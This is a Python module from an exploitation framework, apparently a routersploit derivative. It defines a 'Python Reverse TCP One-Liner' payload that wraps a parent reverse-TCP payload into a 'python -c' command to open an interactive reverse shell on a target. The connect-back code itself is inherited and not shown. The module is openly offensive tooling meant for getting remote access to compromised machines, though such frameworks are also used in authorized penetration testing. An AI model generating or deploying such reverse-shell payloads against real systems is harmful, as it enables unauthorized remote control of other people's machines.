from wirelessxpl.core.exploit import *
from wirelessxpl.modules.payloads.python.reverse_tcp import Payload as PythonReverseTCP


class Payload(PythonReverseTCP):
    __info__ = {
        "name": "Python Reverse TCP One-Liner",
        "description": "Creates interactive tcp reverse shell by using python one-liner.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # wirelessxpl module
        ),
    }

    cmd = OptString("python", "Python binary")

    def generate(self):
        self.fmt = self.cmd + ' -c "{}"'
        payload = super(Payload, self).generate()
        return payload
